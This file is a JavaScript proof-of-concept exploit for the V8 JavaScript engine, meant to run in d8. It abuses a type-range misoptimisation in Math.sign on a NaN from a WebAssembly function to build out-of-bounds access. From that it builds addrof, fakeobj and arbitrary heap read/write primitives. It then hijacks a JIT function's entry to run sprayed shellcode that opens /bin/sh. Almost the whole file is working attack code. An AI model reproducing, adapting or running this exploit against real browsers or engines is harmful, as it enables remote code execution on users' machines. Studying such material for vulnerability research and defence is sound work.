// ./d8 poc.js

const offset = {
  flt: { elements: 41 /* upper */},
  obj: { elements: 48 /* lower */},
  rdw: { elements: 57 /* upper */}
};

let _buf = new ArrayBuffer(8);
let _flt = new Float64Array(_buf);
let _int = new BigUint64Array(_buf);

function ftoi(x) {
  _flt[0] = x;
  return _int[0];
}

function itof(x) {
  _int[0] = x;
  return _flt[0];
}

function hex(x) {
  return `0x${x.toString(16)}`;
}

// execve("/bin/sh", 0, 0);
const pwn = () => {
  return [
    1.9711828979523134e-246,
    1.9562205631094693e-246,
    1.9557819155246427e-246,
    1.9711824228871598e-246,
    1.971182639857203e-246,
    1.9711829003383248e-246,
    1.9895153920223886e-246,
    1.971182898881177e-246
  ];
};

for (let i = 0; i < 100_000; i++) {
  pwn();
}

// ```wasm
// (module
//   (func (export "evil") (param f32) (result f32)
//     local.get 0))
// ```
let wasm = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 6, 1, 96, 1, 125, 1, 125, 3, 2, 1, 0, 7, 8, 1, 4, 101, 118, 105, 108, 0, 0, 10, 6, 1, 4, 0, 32, 0, 11]);
let module = new WebAssembly.Module(wasm);
let instance = new WebAssembly.Instance(module);

function _leak_opt(x) {
  let z = instance.exports.evil(x);

  z = Math.sign(z);   // Static type: Range(-1, 1), Actual: NaN
  z >>= 30;           // Static type: Range(-1, 0), Actual: -2
  z += 1;             // Static type: Range(0, 1),  Actual: -1
  z = -z;             // Static type: Range(-1, 0), Actual: 1
  z = Math.max(z, 0); // Static type: Range(0, 0),  Actual: 1

  let a = [1.1, 2.2];
  let b = [1.1, 2.2];

  return [a.at(z*7), a, b];
}

for (let i = 0; i < 100_000; i++) {
  _leak_opt(NaN);
}

function _leak() {
  let leak = _leak_opt(NaN)[0]; 
  return ftoi(leak) & 0xffffffffn;
}

function _addrof_opt(x, o) {
  let z = instance.exports.evil(x);

  z = Math.sign(z);   // Static type: Range(-1, 1), Actual: NaN
  z >>= 30;           // Static type: Range(-1, 0), Actual: -2
  z += 1;             // Static type: Range(0, 1),  Actual: -1
  z = -z;             // Static type: Range(-1, 0), Actual: 1
  z = Math.max(z, 0); // Static type: Range(0, 0),  Actual: 1

  let a = [1.1, 2.2];
  let b = [o, {}];

  return [a.at(z*8), a, b];
}

for (let i = 0; i < 100_000; i++) {
  _addrof_opt(NaN, {a: 1});
}

function _addrof(o) {
  let addr = _addrof_opt(NaN, o)[0];
  return ftoi(addr) >> 0x20n;
}

function _fakeobj_opt(x, p) {
  let z = instance.exports.evil(x);

  z = Math.sign(z);   // Static type: Range(-1, 1), Actual: NaN
  z >>= 30;           // Static type: Range(-1, 0), Actual: -2
  z += 1;             // Static type: Range(0, 1),  Actual: -1
  z = -z;             // Static type: Range(-1, 0), Actual: 1
  z = Math.max(z, 0); // Static type: Range(0, 0),  Actual: 1

  let a = [1, {}]; 
  let b = [p, 2.2];

  return [a.at(z*8), a, b];
}

for (let i = 0; i < 100_000; i++) {
  _fakeobj_opt(NaN, 1.1);
}

function _fakeobj(p) {
  return _fakeobj_opt(NaN, itof(p));
}

let leak = _leak();
console.log('exp.js: [*] leak = ' + hex(leak));

let evil = [1.1, 2.2];
evil[0] = itof((0x219n << 0x20n) + leak);
evil[1] = itof((0xa72n << 0x20n) + _addrof(evil));

let flt = [1.1];
let obj = [{a: 1}];
let rdw = [1.1]; 

let oob = _fakeobj(_addrof(evil) + 0x20n)[0];
console.log('exp.js: [*] oob.length = ' + oob.length);

// flt.elements = obj.elements
let _tmp = ftoi(oob[offset.obj.elements]) & 0xffffffffn;
oob[offset.flt.elements] = itof((_tmp << 0x20n) + 0x219n);

console.log('exp.js: [*] flt.elements @ ' +
  hex(ftoi(oob[offset.flt.elements]) >> 0x20n));
console.log('exp.js: [*] obj.elements @ ' +
  hex(ftoi(oob[offset.obj.elements]) & 0xffffffffn));
console.log('exp.js: [*] rdw.elements @ ' +
  hex(ftoi(oob[offset.rdw.elements]) >> 0x20n));

function addrof(o) {
  obj[0] = o;
  let r = ftoi(flt[0]) & 0xffffffffn;
  return r - 1n;
}

function heap_read(p) {
  let s = oob[offset.rdw.elements];

  let t = p - 0x8n + 1n;
  oob[offset.rdw.elements] = itof((t << 0x20n) + 0x219n);

  let r = ftoi(rdw[0]); 
  oob[offset.rdw.elements] = s;

  return r;
}

function heap_write(p, x) {
  let s = oob[offset.rdw.elements];

  let t = p - 0x8n + 1n;
  oob[offset.rdw.elements] = itof((t << 0x20n) + 0x219n);

  rdw[0] = itof(x);
  oob[offset.rdw.elements] = s;
}

let code = (heap_read(addrof(pwn) + 0x18n) - 1n) & 0xffffffffn;
console.log('exp.js: [*] code @ ' + hex(code));

let entry = heap_read(code + 0x10n);
console.log('exp.js: [*] entry @ ' + hex(entry));

heap_write(code + 0x10n, entry + 0x56n);
pwn();

